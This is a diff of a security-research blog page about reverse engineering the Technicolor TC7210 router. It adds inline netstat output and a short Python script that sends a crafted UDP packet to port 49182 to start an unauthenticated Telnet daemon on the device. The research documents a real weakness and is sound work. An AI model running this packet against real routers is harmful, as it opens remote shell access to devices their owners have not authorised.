@@ -41,7 +41,7 @@
     
   
   
-<meta itemprop="wordCount" content="505" />
+<meta itemprop="wordCount" content="695" />
   
 
 
@@ -171,9 +171,28 @@ Frontdoor to the Technicolor 7210
 <h3 id="control-mechanism">Control Mechanism</h3>
 <p>The TC7210 has two operative systems (OS), the eCos real-time OS, and a Linux based embedded OS. The eCos OS is responsible for managing all network functionalities as well as the Network Attached Storage (NAS) functionalities provided by the Linux OS.</p>
 <p>For that to happen, the eCos OS needs to be able to communicate with the Linux OS. As discussed in the previous article, the <code>smbapp</code> is the application responsible for managing the NAS functionality. A good indicator of how the application is receiving commands from the eCos OS is the fact that it listens on port <code>49182</code> (UDP).</p>
-<script type="application/javascript" src="https://gist.github.com/serializingme/2be71fadd346db82e6ba4ea4ed54fb3c.js?file=netstat.sh"></script>
-
-<p>By revisiting the string analysis performed previously it was possible to find other interesting strings in the <code>smbapp</code> application that indicated some sort of functionality to manage a Telnet server. The strings are: <code>smbapp: Launching telnetd.</code> and <code>smbapp: Killing telnetd</code>. It is possible to confirm this by loading <code>smbapp</code> in a disassembler and searching for references to those strings.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold"></span>netstat -nlp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#999;font-style:italic"># Active Internet connections (only servers)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#999;font-style:italic"># Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#999;font-style:italic"># tcp        0      0 192.168.178.10:4321     0.0.0.0:*               LISTEN      556/bcmmserver</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#999;font-style:italic"># tcp        0      0 192.168.178.10:2468     0.0.0.0:*               LISTEN      556/bcmmserver</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#999;font-style:italic"># tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      2601/smbd</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#999;font-style:italic"># tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      316/portmap</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span><span style="color:#999;font-style:italic"># tcp        0      0 192.168.178.10:80       0.0.0.0:*               LISTEN      556/bcmmserver</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#999;font-style:italic"># tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      2601/smbd</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span><span style="color:#999;font-style:italic"># tcp        0      0 :::23                   :::*                    LISTEN      2596/telnetd</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span><span style="color:#999;font-style:italic"># udp        0      0 192.168.178.10:137      0.0.0.0:*                           2649/nmbd</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#999;font-style:italic"># udp        0      0 0.0.0.0:137             0.0.0.0:*                           2649/nmbd</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#999;font-style:italic"># udp        0      0 192.168.178.10:138      0.0.0.0:*                           2649/nmbd</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#999;font-style:italic"># udp        0      0 0.0.0.0:138             0.0.0.0:*                           2649/nmbd</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#999;font-style:italic"># udp        0      0 0.0.0.0:49181           0.0.0.0:*                           386/mscapp</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span><span style="color:#999;font-style:italic"># udp        0      0 0.0.0.0:49182           0.0.0.0:*                           328/smbapp</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span><span style="color:#999;font-style:italic"># udp        0      0 0.0.0.0:1900            0.0.0.0:*                           556/bcmmserver</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span><span style="color:#999;font-style:italic"># udp        0      0 0.0.0.0:111             0.0.0.0:*                           316/portmap</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span><span style="color:#999;font-style:italic"># Active UNIX domain sockets (only servers)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span><span style="color:#999;font-style:italic"># Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path</span>
+</code></pre></div><p>By revisiting the string analysis performed previously it was possible to find other interesting strings in the <code>smbapp</code> application that indicated some sort of functionality to manage a Telnet server. The strings are: <code>smbapp: Launching telnetd.</code> and <code>smbapp: Killing telnetd</code>. It is possible to confirm this by loading <code>smbapp</code> in a disassembler and searching for references to those strings.</p>
 <div class="text-center"><figure class="figure">
     <a href="https://www.serializing.me/uploads/2018/10/tc7210-telnet-control.png" title="Starting and stopping the Telnet daemon.">
       <img class="figure-img img-fluid rounded" alt="Telnetd control" src="https://www.serializing.me/uploads/2018/10/tc7210-telnet-control-800x247.png" />
@@ -195,9 +214,21 @@ Frontdoor to the Technicolor 7210
 <p>From the flow of execution depicted above, we can see that the first word of the packet that needs to be sent is <code>0x107</code>, the following word doesn&rsquo;t really matter, and the last double word should be <code>0x00000001</code>.</p>
 <h3 id="exploitation">Exploitation</h3>
 <p>With this information, the next step was to hack up a script that would send the right bytes to the listening socket of the <code>smbapp</code>.</p>
-<script type="application/javascript" src="https://gist.github.com/serializingme/2be71fadd346db82e6ba4ea4ed54fb3c.js?file=exploit.py"></script>
-
-<div class="alert alert-info"><span><i class="fas fa-info-circle"></i>&nbsp;</span>The script needs to be executed with Python 3.</div>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">socket</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>ADDRESS = <span style="color:#ed9d13">&#39;&lt;IP address of the NAS&gt;&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>PORT = <span style="color:#3677a9">49182</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>PACKET = <span style="color:#24909d">bytes</span>([
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>    <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0x07</span>, <span style="color:#3677a9">0xFF</span>, <span style="color:#3677a9">0xFF</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x01</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>])
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>sock.sendto(PACKET, (ADDRESS, PORT))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>line, server = sock.recvfrom(<span style="color:#3677a9">128</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#24909d">print</span>(line)
+</code></pre></div><div class="alert alert-info"><span><i class="fas fa-info-circle"></i>&nbsp;</span>The script needs to be executed with Python 3.</div>
 <p>Using the script against the NAS functionality of the router, we get an awesome Telnet prompt. Further to the above, it is also possible to control an HTTP server (that exposes some CGI scripts), and whether the Linux OS responds to pings.</p>
 <div class="text-center"><figure class="figure">
     <a href="https://www.serializing.me/uploads/2018/10/tc7210-exploit.png" title="Outcomes of the execution of the script.">
